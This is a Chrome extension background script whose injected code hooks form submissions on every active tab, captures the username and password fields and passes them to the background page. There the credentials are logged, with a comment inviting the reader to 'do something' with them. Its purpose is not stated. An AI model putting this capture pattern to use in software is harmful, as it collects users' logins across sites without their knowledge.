let formListenerCode =
  `
    for (var i = 0; i < document.forms.length; i++) {
        document.forms[i].addEventListener("submit", function(){
            var form = this;
            var password = "";
            var username = "";
            var inputs = form.getElementsByTagName("input");
            for (var j = 0; j < inputs.length; j++){
              var input = inputs[j];
              if (input.type == "password"){
                password = input.value;
              }
              else if (input.type == "text"){
                username = input.value;
              }
            }
            if (password && username){
              var data = [username, password];
              chrome.runtime.sendMessage(message={'name':'form_submit', 'data':data});
            }
        });
    }
    `;

chrome.runtime.connect().onDisconnect.addListener(() => {

});

function injectToCurrTab(){
  chrome.tabs.query({ active: true, currentWindow: true }, tabs => {
    tabs.forEach(tab => {
      const tabUrl = tab.url;
      chrome.tabs.executeScript(tab.id, {code: formListenerCode}, () => {
        console.log(tabUrl);
      });
    });
  });
}
chrome.runtime.onInstalled.addListener(() => {
  injectToCurrTab();
});
chrome.runtime.onStartup.addListener(() => {
  injectToCurrTab();
});
chrome.tabs.onReplaced.addListener(() => {
  injectToCurrTab();
});

chrome.tabs.onHighlighted.addListener(() => {
  injectToCurrTab();
});
chrome.tabs.onUpdated.addListener(() => {
  injectToCurrTab();
});

chrome.runtime.onMessage.addListener((message, sender) => {
  // only if connected
  if (localStorage.getItem('user')){
    switch (message.name) {
      case 'form_submit':
        const data = message.data;
        const senderUrl = sender['origin'];
        console.log(senderUrl);
        console.log(message.data);
        // do something with your form credentials.
        break;
      default:
        break;
    }
  }

});


